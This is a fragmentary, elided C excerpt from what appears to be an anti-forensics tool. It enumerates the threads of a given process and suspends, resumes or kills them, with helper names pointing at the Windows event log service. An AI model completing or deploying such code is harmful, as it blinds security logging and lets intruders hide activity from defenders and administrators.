...
BOOL ListProcessThreads(DWORD pid, char *command)
{
	...
	do
	{
		if (te32.th32OwnerProcessID == pid)
		{
			...
			{
				printf("suspend tid=%d => ", te32.th32ThreadID);
				SuspendEventlogThread(te32.th32ThreadID);
			}
			else if (strcmp(command, "resume") == 0) {
				printf("resume tid=%d => ", te32.th32ThreadID);
				ResumeEventlogThread(te32.th32ThreadID);
			}else if (strcmp(command, "kill") == 0) {
				printf("kill tid=%d => ", te32.th32ThreadID);
				KillEventlogThread(te32.th32ThreadID);
			}
